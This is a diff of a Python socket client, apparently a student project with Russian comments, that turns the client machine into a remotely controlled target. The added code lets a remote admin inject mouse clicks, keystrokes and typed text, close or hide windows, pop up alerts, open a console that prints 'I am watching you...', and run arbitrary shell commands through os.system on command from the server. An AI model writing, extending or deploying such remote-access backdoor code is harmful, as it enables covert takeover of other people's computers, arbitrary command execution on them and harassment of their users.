@@ -3,11 +3,69 @@ import time
 import threading
 import random
 import os
+import mouse
+import keyboard
+import pyautogui
 
 
-# TODO: тесты создавания айдишников (как?) Первую генерацию - 26780, вторую - рандом
-# TODO: комментарии для новых режимов + коммит на гитхаб
-# TODO: print() на команды вида msg$text
+# TODO: проверки на ошибки выполнения (что если отключить интернет?)
+# TODO: ломаем сервер как можем) *а это мы можем*
+
+def clickLeft():
+    print(1)
+    mouse.click("left")
+    print(2)
+def clickRight():
+    mouse.click("right")
+def typing(text):
+    time.sleep(0.2)
+    keyboard.write(text)
+def switchWindow():
+    print("pressing alt")
+    keyboard.press("alt+tab")
+    keyboard.release("alt+tab")
+def closeWindow():
+    keyboard.press("alt")
+    keyboard.press("f4")
+    keyboard.release("alt")
+    keyboard.release("f4")
+def hideWindows():
+    keyboard.press("win")
+    keyboard.press("d")
+    keyboard.release("win")
+    keyboard.release("d")
+def changeLanguage():
+    keyboard.press("shift")
+    keyboard.press("alt")
+    keyboard.release("shift")
+    keyboard.release("alt")
+def Mystify():
+    os.system("Mystify.scr -a")
+def watchingYou():
+    os.system("start cmd")
+    time.sleep(0.1)
+    keyboard.write("I am watching you...", 0.1)
+    time.sleep(1.0)
+    keyboard.press("alt")
+    keyboard.press("f4")
+    keyboard.release("alt")
+    keyboard.release("f4")
+def cmdCommand(cmd):
+    os.system(cmd)
+def pressKey(key):
+    keyboard.press(key)
+    keyboard.release(key)
+def dragMouse(x,y):
+    mouse.drag(0, 0, x, y, absolute=False, duration=0.02)
+def alert(text):
+    pyautogui.alert(text=text, title="Alert", button="OK")
+def warning(text):
+    pyautogui.alert(text=text, title="Warning", button="OK")
+def scroll(direction):
+    for i in range(8):
+        mouse.wheel(int(direction))
+
+
 # admin -> client
 # A$127.0.0.1$26780$cmd$exe
 # admin <- client
@@ -26,15 +84,26 @@ class Thread1(threading.Thread):  # потоки через класс тк thre
         global answer
         global user
         global uniIdUser
+
         while True:  # бесконечный цикл с приемом данных (в отдельном потоке)
             if user == "admin":
                 data = client.recv(2048)
+                d = data.decode("utf-8")  # декодирование файлов в привычный нам вид
                 if data:
-                    d = data.decode("utf-8")  # декодирование файлов в привычный нам вид
-                    if "msg$IDREFRESH" in d:  # msg$IDREFRESH - специальный запрос, при котором клиент должен отправить серверу
-                        # свой id, чтобы сервер понимал, какие пользователи активны
-                        client.send(f"IDREFRESH${uniIdUser}${client.getsockname()[0]}\n".encode("utf-8"))
-                        #  client.getsockname()[0] - ip адресс клиента
+                    if "SYS" in d:
+                        d = d[:-2]
+                        command = d.split("$")
+                        if command[1] == "MSG":
+                            print(f"MSG from server: {command[2]}")
+                        elif command[1] == "DISCONNECT":
+                            print("Server sent disconnecting packet. Killing this process...")
+                            client.shutdown(socket.SHUT_RDWR)
+                            client.close()
+                            os.kill(os.getpid(), 9)
+                        elif command[1] == "SHUTDOWN":
+                            print("Server is shutting down! Killing this process...")
+                            client.close()
+                            os.kill(os.getpid(), 9)
                     else:
                         print(f"DATA FROM SERVER: {d}")  # вывод данных на экран
                         answer = True  # переменная которая нужна для красивого, разборчивого вывода информации в админской консоли
@@ -43,29 +112,132 @@ class Thread1(threading.Thread):  # потоки через класс тк thre
                 # будет потреблять меньше ресурсов)
             elif user == "client":
                 data = client.recv(2048)
+                d = data.decode("utf-8")
                 if data:
-                    d = data.decode("utf-8")
                     print(f"DATA FROM SERVER: {d}")
                     if "$" in d:
                         d = d[:-2]
                         command = d.split("$")
                         if command[1] == "mystify": # удаленный запуск команд
                             try:
-                                os.system("Mystify.scr -a")
+                                Mystify()
                                 client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                                 print(f"sending to server: C${command[0]}${uniIdUser}$success")
                             except BaseException:
                                 client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                                print(f"sending to server: C${command[0]}${uniIdUser}$fail")
+                        elif command[1] == "click":
+                            if command[2] == "left":
+                                try:
+                                    clickLeft()
+                                    client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                                except BaseException:
+                                    client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
+                            elif command[2] == "right":
+                                try:
+                                    clickRight()
+                                    client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                                except BaseException:
+                                    client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
+                            else:
+                                client.send(f"C${command[0]}${uniIdUser}$invalidArgs\n".encode("utf-8"))
+                        elif command[1] == "type":
+                            try:
+                                typing(command[2])
+                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                            except BaseException:
+                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
+                        elif command[1] == "altab":  # удаленный запуск команд
+                            print("Got command!!!")
+                            try:
+                                print("Starting switching window")
+                                switchWindow()
+                                print(2)
+                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                                 print(f"sending to server: C${command[0]}${uniIdUser}$success")
-                        elif "msg$IDREFRESH" in d:
-                            client.send(f"IDREFRESH${uniIdUser}${client.getsockname()[0]}\n".encode("utf-8"))
-                        else: # TODO: НЕ ЗАБУДЬ ЭТО УДАЛИТЬ, ЭТО ТОЛЬКО ДЛЯ ТЕСТОВ!!! ПОТОМ UNKNOWN COMMAND !!!!!!!!!!!!!!!!
-                            client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
-                            print(f"sending: C${command[0]}${uniIdUser}$success")
+                            except BaseException:
+                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                                print(f"sending to server: C${command[0]}${uniIdUser}$fail")
+                        elif command[1] == "close":
+                            try:
+                                closeWindow()
+                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                            except BaseException:
+                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
+                        elif command[1] == "hide":
+                            try:
+                                hideWindows()
+                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                            except BaseException:
+                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
+                        elif command[1] == "lang":
+                            try:
+                                changeLanguage()
+                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                            except BaseException:
+                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
+                        elif command[1] == "watching":
+                            try:
+                                watchingYou()
+                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                            except BaseException:
+                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
+                        elif command[1] == "cmd":
+                            try:
+                                cmdCommand(command[2])
+                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                            except BaseException:
+                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
+                        elif command[1] == "press":
+                            try:
+                                pressKey(command[2])
+                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                            except BaseException:
+                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
+                        elif command[1] == "drag":
+                            try:
+                                pos1 = command[2].split(" ")
+                                pos = list(map(int, pos1))
+                                print(type(pos[0]), type(pos[1]))
+                                if isinstance(pos[0], int) and isinstance(pos[1], int):
+                                    dragMouse(pos[0], pos[1])
+                                    client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                                else:
+                                    client.send(f"C${command[0]}${uniIdUser}$invalidArgs\n".encode("utf-8"))
+                            except Exception as e:
+                                print(e)
+                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
+                        elif command[1] == "alert":
+                            try:
+                                alert(command[2])
+                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                            except BaseException:
+                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
+                        elif command[1] == "warning":
+                            try:
+                                warning(command[2])
+                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                            except BaseException:
+                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
+                        elif command[1] == "scroll":
+                            try:
+                                scroll(command[2])
+                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
+                            except BaseException:
+                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
+                        else:
+                            client.send(f"C${command[0]}${uniIdUser}$unknownCommand\n".encode("utf-8"))
+                    elif "SYS" in d:
+                        d = d[:-2]
+                        command = d.split("$")
+                        if command[1] == "SHUTDOWN":
+                            print("Server -> client disconnect")
+                            os.kill(os.getpid(), 9)
+                        elif command[1] == "DISCONNECT":
+                            print("Server -> client disconnect")
+                            os.kill(os.getpid(), 9)
 
                     answer = True
-
-
 class Thread2(threading.Thread):  # поток для бесконечной отправки данных на сервер (когда нам надо)
     def run(self):
         global user
@@ -104,12 +276,11 @@ class Thread2(threading.Thread):  # поток для бесконечной о�
                                 delay = True
                                 continue
                     elif fileOrNot == "2":  # блиц-опрос по параметрам, далее в соответствии с ними генерируется команда
-                        targetIP = input("Enter target ip\n")
                         targetID = input("Enter target id\n")
                         command = input("Enter command for your target\n")
                         args = input("Enter args for your command\n")
 
-                        s = f"A${targetIP}${targetID}${command}${args}\n"
+                        s = f"A${targetID}${command}${args}\n"
                         client.send(s.encode("utf-8"))
                         print(f"sent {s}")
                         time.sleep(1)
@@ -119,9 +290,11 @@ class Thread2(threading.Thread):  # поток для бесконечной о�
                         c = f"{input(str1)}\n"
                         client.send(c.encode("utf-8"))
                     elif fileOrNot == "4":  # Уже сгенерированная команда для тестов
-                        client.send("A$127.0.0.1$26780$cmd$exe\n".encode("utf-8"))
+                        client.send("A$26780$click$left\n".encode("utf-8"))
                     else:
                         print("Unknown mode. Try again!")
+            elif user == "client":
+                input()  # Если это работает, то это писал Акимов Арсений, если нет - Артем Науменко
 
 
 
@@ -151,18 +324,18 @@ if user == "admin":  # выбираем пользователя
         client.send(s.encode("utf-8"))
         data = client.recv(2048).decode("utf-8")
 
-        while data != "Registration success":
+        while "Registration success" not in data:
             i = random.randint(1, 32000)
-            uniIdAdmin = i
+            uniIdAdmin = -i
 
             s = "Admin$" + str(uniIdAdmin) + "\n"  # отправляем на сервер специальную строку. ВАЖНО!!! после всех
             # строк
             client.send(s.encode("utf-8"))
             data = client.recv(2048).decode("utf-8")
+            print(f"data: {data}")
         f = open("adminUniID.txt", "w")
-        f.write(str(uniIdAdmin))
+        f.write(str(-uniIdAdmin))
         f.close()
-        print(data)
 
 elif user == "client":
     print("Logged as Client")
@@ -207,13 +380,12 @@ else:
 if user == "admin":
     # пишем \n или работать не будет
     print("Enter your commands!")
-    t1 = Thread1()  # запускаем обмен данными с сервером
-    t1.start()
-    t2 = Thread2()
-    t2.start()
-elif user == "client":  # TODO: не копию админского клиента
+
+elif user == "client":
     print("Enter your commands!")
-    t1 = Thread1()  # чтение данных
-    t1.start()
-    t2 = Thread2()  # их отправка
-    t2.start()
+
+
+t1 = Thread1()  # запускаем обмен данными с сервером
+t1.start()
+t2 = Thread2()
+t2.start()
